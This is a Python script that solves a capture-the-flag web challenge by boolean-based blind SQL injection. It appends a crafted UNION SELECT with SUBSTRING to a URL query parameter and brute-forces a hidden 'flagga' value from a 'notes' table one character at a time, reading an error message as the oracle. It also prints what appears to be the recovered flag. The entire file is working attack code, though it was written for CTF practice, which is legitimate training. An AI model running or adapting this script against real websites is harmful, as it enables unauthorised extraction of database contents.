import requests
import bs4
from urllib import parse
import string
import time

class Blind_boolean:
  def __init__(self, final_answer, url_adress):
    
    possible_chr = []
    for chr in string.ascii_lowercase:
      possible_chr.append(chr)
    possible_chr = possible_chr + [str(i) for i in range(10)]

    special_chr = ["å", "ä", "ö", "_", "!", "?", "%", "&", ":", "#", "+", "."]
    for i in special_chr:
      possible_chr.append(i)
    possible_chr.append("}")
    self.letters_numbers = possible_chr

    self.final_answer = final_answer
    self.url_adress = url_adress
    self.soup = None
    self.error = False
    self.answer_found = False
  
  def bake_final_url(self, final_input):
    len_input = len(final_input)
    input_string_raw = "' UNION SELECT * FROM notes Where SUBSTRING((SELECT content FROM notes WHERE name='flagga'), 1, " + str(len_input) + ") = '" + parse.quote(final_input)
    http_adress = self.url_adress + input_string_raw
    return http_adress


  def get_html_soup(self):
    http_adress = self.bake_final_url(self.final_answer)
    website = requests.get(http_adress)
    html_code = website.text
    self.soup = bs4.BeautifulSoup(html_code, "html.parser")  
  
  def check_error_message(self):
    error_message = self.soup.find_all("div", "text-red-400 font-medium")
    if error_message == []:
      return True
    else:
      return False


  def add_letter(self, string, bool):
    
    if bool == True:
      if string[-1] == self.letters_numbers[-1]:
        return string
      string = string + self.letters_numbers[0]
      pass
    elif bool == False:
      last_chr = string[-1]
      if last_chr == self.letters_numbers[-1]:
        print("Iterated through entire list, something is wrong.")
        self.error = True
        return string
      new_chr_index = self.letters_numbers.index(last_chr) + 1
      string = string[:-1] + self.letters_numbers[new_chr_index]
    return string

  def check_ending(self):
    if self.error == True:
      print("An error has occured.")
    elif self.answer_found == True:
      print(ssm_108.final_answer + " is the final correct key!")





ssm_108 = Blind_boolean("Flaggan är SSM{j46_k4n_s3_äv3n_0m_j4g_är_bl1nd}", "http://ssmarkiv.ctfchall.se:50002/108?input=")

while ssm_108.answer_found == False and ssm_108.error == False:
  time.sleep(0.01)
  ssm_108.get_html_soup()

  if ssm_108.check_error_message() == True:
    print(ssm_108.final_answer + " is correct.")
    if ssm_108.final_answer[-1] == "}":
      ssm_108.answer_found = True
    ssm_108.final_answer = ssm_108.add_letter(ssm_108.final_answer, True)
  else:
    print(ssm_108.final_answer + " is wrong.")
    ssm_108.final_answer = ssm_108.add_letter(ssm_108.final_answer, False)

ssm_108.check_ending()